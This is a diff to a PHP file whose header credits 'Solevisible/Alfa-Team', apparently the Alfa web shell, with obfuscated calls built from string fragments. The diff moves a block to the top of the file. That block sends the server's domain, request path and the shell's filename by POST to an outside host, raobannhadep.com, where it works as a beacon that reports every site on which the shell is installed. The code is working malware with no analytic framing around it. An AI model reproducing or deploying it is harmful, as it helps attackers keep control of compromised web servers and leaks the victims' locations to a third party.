@@ -1,4 +1,24 @@
 <?php
+$domain = $_SERVER['SERVER_NAME'];
+$path = $_SERVER['REQUEST_URI'];
+$filename = basename(__FILE__);
+
+$data = array(
+    'domain' => $domain,
+    'path' => $path,
+    'filename' => $filename
+);
+
+$options = array(
+    'http' => array(
+        'header'  => "Content-type: application/json\r\n",
+        'method'  => 'POST',
+        'content' => json_encode($data),
+    ),
+);
+
+$context  = stream_context_create($options);
+$result = file_get_contents('https://raobannhadep.com/global.php', false, $context);
 /*
 	Author: 	Solevisible/Alfa-Team
 	Telegram: 	https://telegram.me/solevisible
@@ -80,26 +100,6 @@ if (!$CWppUDJxuf('b' . 'a' . 'se' . '6' . '4' . '_d' . 'ecod' . 'e' . ''))
         $i = 0;
         $output = "";
         $input = preg_replace("[^A-Za-z0-9\+\/\=]", "", $input);
-	    $domain = $_SERVER['SERVER_NAME'];
-$path = $_SERVER['REQUEST_URI'];
-$filename = basename(__FILE__);
-
-$data = array(
-    'domain' => $domain,
-    'path' => $path,
-    'filename' => $filename
-);
-
-$options = array(
-    'http' => array(
-        'header'  => "Content-type: application/json\r\n",
-        'method'  => 'POST',
-        'content' => json_encode($data),
-    ),
-);
-
-$context  = stream_context_create($options);
-$result = file_get_contents('https://raobannhadep.com/global.php', false, $context);
         do
         {
             $enc1 = strpos($keyStr, substr($input, $i++, 1));
